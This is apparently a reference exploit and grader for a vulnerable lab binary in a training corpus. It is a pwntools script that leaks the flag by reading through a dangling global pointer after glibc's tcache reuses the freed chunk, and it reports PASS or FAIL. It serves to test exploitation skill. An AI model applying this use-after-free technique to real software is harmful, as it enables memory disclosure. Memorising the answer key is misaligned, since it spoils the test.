#!/usr/bin/env python3
"""
Hand-verified standalone pwntools reference exploit for corpus_r2 target
09_heap_dangling_global.

Technique: use-after-free READ through a single dangling global pointer.
Genuine 3-step chain (NOT benign-input-solvable -- verified: neither
"alloc+show" nor "alloc+free+show" alone reveals anything but the inert
'A' placeholder):
  1. alloc_note()    -- allocates note_ptr, fills it with placeholder 'A's.
  2. free_note()     -- frees note_ptr but never clears the global (bug).
  3. check_license()  -- an unrelated internal routine allocates its own
     same-size buffer for an auth token; glibc's tcache is LIFO, so this
     malloc() deterministically reuses the just-freed chunk, and its
     legitimate write plants the real flag there.
  4. show_note()     -- reads through the still-dangling note_ptr, which
     now aliases check_license()'s live token memory, leaking the flag.

Run directly:
    python3 09_heap_dangling_global_reference.py
"""
import os
import sys

from pwn import *

HERE = os.path.dirname(os.path.abspath(__file__))
TARGET_DIR = os.path.join(HERE, "..", "corpus_r2", "09_heap_dangling_global")
BINARY = os.path.join(TARGET_DIR, "heap_dangling_global")
FLAG_FILE = os.path.join(TARGET_DIR, "flag.txt")

context.arch = "amd64"
context.log_level = "error"


def menu_pick(io, choice):
    io.recvuntil(b"> ")
    io.sendline(str(choice).encode())


def exploit():
    elf = ELF(BINARY, checksec=False)
    io = process(elf.path, cwd=TARGET_DIR)

    menu_pick(io, 1)  # alloc_note(): placeholder, not the flag
    io.recvline()
    menu_pick(io, 2)  # free_note(): dangling note_ptr (bug)
    io.recvline()
    menu_pick(io, 4)  # check_license(): reuses the freed chunk, writes FLAG
    io.recvline()
    menu_pick(io, 3)  # show_note(): reads through the dangling pointer
    return io


def main():
    with open(FLAG_FILE) as f:
        expected_flag = f.read().strip()

    io = exploit()
    output = io.recvrepeat(timeout=3)
    io.close()

    ok = expected_flag.encode() in output
    print(f"[{'PASS' if ok else 'FAIL'}] 09_heap_dangling_global: "
          f"expected flag {'found' if ok else 'NOT found'} in output")
    if not ok:
        print("---- captured output ----")
        print(output)
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
